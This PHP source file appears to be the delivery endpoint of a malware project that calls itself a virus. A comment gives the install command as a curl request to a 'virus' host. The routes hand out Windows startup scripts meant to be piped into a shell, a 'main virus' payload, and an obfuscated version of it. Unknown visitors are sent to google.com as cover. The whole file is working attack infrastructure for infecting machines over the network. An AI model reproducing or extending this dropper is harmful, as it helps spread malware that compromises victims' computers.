<?php /** @noinspection PhpMissingBreakStatementInspection */

require_once(__DIR__ . "/../autoload.php");

/**
 * This file is used to install the virus. The command should be curl https://virus.kelvinho.org/new/{user_id}. This file only does that.
 */

use Kelvinho\Virus\Attack\BaseScriptWin;
use Kelvinho\Virus\Header;
use Kelvinho\Virus\User;
use Kelvinho\Virus\Virus;
use function Kelvinho\Virus\filter;

#\header("Location: http://google.com/");
#Header::redirect();

$endpoint = $_GET["endpoint"];
$endpoints = explode("/", $endpoint);
$endpoints = filter($endpoints, function ($element) {
    return !empty($element);
});
if (count($endpoints) === 0) {
    \header("Location: http://google.com/");
    Header::redirect();
}
$user_handle = $endpoints[1];
if (User::exists($user_handle)) {
    switch (@$endpoints[0]) {
        case "win":
            switch (@$endpoints[2]) {
                case "location": // /new/win/{user_handle}/location, startup script, will be executed as a script
                    array_splice($endpoints, 0, 3);
                    $location = join("/", $endpoints);
                    $virus = Virus::new($user_handle);
                    echo BaseScriptWin::initStandalone($virus->getVirusId(), $user_handle, urldecode($location));
                    Header::ok();
                case "entry": // /new/win/{user_handle}/entry
                case "mn": // /new/win/{user_handle}/mn, the main virus
                    $virus_id = $endpoints[3];
                    echo BaseScriptWin::main($virus_id);
                    Header::ok();
                case "license": // /new/win/{user_handle}/license
                    echo BaseScriptWin::license();
                    Header::ok();
                case "swarm":
                    Header::ok(); // TODO
                default: // /new/win/{user_handle}, startup script, will be piped into a shell
                    $virus = Virus::new($user_handle);
                    echo BaseScriptWin::initStandalone($virus->getVirusId(), $user_handle);
                    Header::ok();
            }
        case "mac":
            switch (@$endpoints[2]) {
                case "location":
                case "mn":
                case "license":
                default:
            }
            Header::ok();
        case "complex":
            echo BaseScriptWin::complexMain("209b093ec7c0610777b784fb29db4eb39b526a0a5c17c84040061a01ddb5b9e3");
            Header::ok();
        case "obfuscate":
            echo BaseScriptWin::obfuscate(BaseScriptWin::complexMain("209b093ec7c0610777b784fb29db4eb39b526a0a5c17c84040061a01ddb5b9e3"));
            Header::ok();
        case "test":
            $string = "case \"entry\": // /new/{user_handle}/entry/{virus_id}";
            echo str_replace("entry", "mn", $string) . "\n";
            echo $string;
        default:
            Header::ok();
    }
}
/*
if (User::exists($user_handle)) {
    switch (@$endpoints[1]) {
        case "entry": // /new/{user_handle}/entry/{virus_id}
            $virus_id = $endpoints[2];
            echo BaseScript::entry($virus_id);
            Header::ok();
        case "worker": // /new/{user_handle}/worker
            echo BaseScript::worker();
            Header::ok();
        case "unixTime": // /new/{user_handle}/unixTime
            echo BaseScript::unixTime();
            Header::ok();
        case "license":
            echo BaseScript::license();
            Header::ok();
        default: // /new/{user_handle}
            if (count($endpoints) <= 1) {
                $virus = Virus::new($user_handle);
                echo BaseScript::init($virus->getVirusId(), $user_handle);
                Header::ok();
            } else {
                unset($endpoints[0]);
                $location = join("/", $endpoints);
                $virus = Virus::new($user_handle);
                echo BaseScript::init($virus->getVirusId(), $user_handle, urldecode($location));
                Header::ok();
            }
    }
}
/**/